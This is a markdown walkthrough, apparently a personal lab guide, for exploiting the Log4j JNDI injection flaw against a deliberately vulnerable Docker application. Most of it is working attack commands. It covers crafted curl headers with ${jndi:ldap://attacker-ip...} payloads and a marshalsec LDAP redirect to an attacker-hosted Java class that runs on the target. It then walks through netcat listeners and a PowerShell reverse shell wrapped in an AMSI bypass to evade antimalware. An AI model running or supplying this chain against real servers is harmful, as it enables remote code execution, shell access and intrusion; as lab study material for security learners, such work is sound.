# Log4j Vulnerability

## Author

### Kevin Doolaeghe

## Reference

* [Java - Apache Log4j 2 Library](https://logging.apache.org/log4j/2.x/)
* [LunaSec - RCE 0-day exploit POC](https://www.lunasec.io/docs/blog/log4j-zero-day/)
* [John Hammond Log4j Proof Of Concept Video](https://www.youtube.com/watch?v=7qoPDq41xhQ&t=1481s)
* [`leonjza` Github Repository - Log4j POC](https://github.com/leonjza/log4jpwn)
* [`xiajun325` Github Repository - Log4j POC](https://github.com/xiajun325/apache-log4j-rce-poc)
* [`christophetd` Github Repository - Log4j POC](https://github.com/christophetd/log4shell-vulnerable-app)
* [Github - Powershell Reverse Shell](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

## Initial Log4j POC (Proof Of Concept)

* Build Docker container running vulnerable Java application :
```
git clone https://github.com/leonjza/log4jpwn
cd log4jpwn
sudo docker build -t log4jpwn .
```

* Launch the vulnerable Java application :
```
sudo docker run --rm -p8080:8080 log4jpwn
```

* Create a `netcat` listener to see the result of the request :
```
nc -lnvp 3333
```

* Send poisonned request to server :
```
curl -H 'User-Agent: ${jndi:ldap://attacker-ip:3333/a}' localhost:8080
```

Replace `attaquer-ip` by the IP address of the malicious server.  
The vulnerable Java application connects to the `netcat` listener on port `3333`.

## Remote Code Execution (RCE)

* Compile `Log4jRCE.java` file :
```
javac Log4jRCE.java
```

* Create HTTP server with Python in the directory that store `Log4jRCE.class` file :
```
python3 -m http.server 5555
```

* Build LDAP server (require Java 8) :
```
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests
```

* Launch the LDAP server with the correct redirection to the HTTP server :
```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker-ip:5555/#Log4jRCE"
```

* Keep the previous vulnerable Java application alive :
```
sudo docker run --rm -p8080:8080 log4jpwn
```

* Send poisonned request to server :
```
curl -H 'X-Api-Version: ${jndi:ldap://attacker-ip:1389/Log4jRCE}' localhost:8080
```

Once the `curl` request is recieved, the target will connect to the LDAP server and run the `Log4jRCE` Java class file.

## Reverse shell attack

* Create `netcat` listener to receive the access to the reverse shell :
```
nc -lnvp 3333
```

* Get [this](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) Powershell script and edit the IP address and the port to match with the target.

* Then, go on [AMSI.fail](https://amsi.fail/) wbesite and copy a `Rasta-mouses Amsi-Scan-Buffer patch`. Encode the previous Rasta-mouses patch followed by the Powershell script into Base64 thanks to a [Powershell encoder](https://raikia.com/tool-powershell-encoder).

* Adapt the code in `Log4jRCE.java` file to run the corresponding command then compile :
```
javac Log4jRCE.java
```

With the LDAP server running, start JNDI injection to the target to establish a reverse shell connection through `netcat`.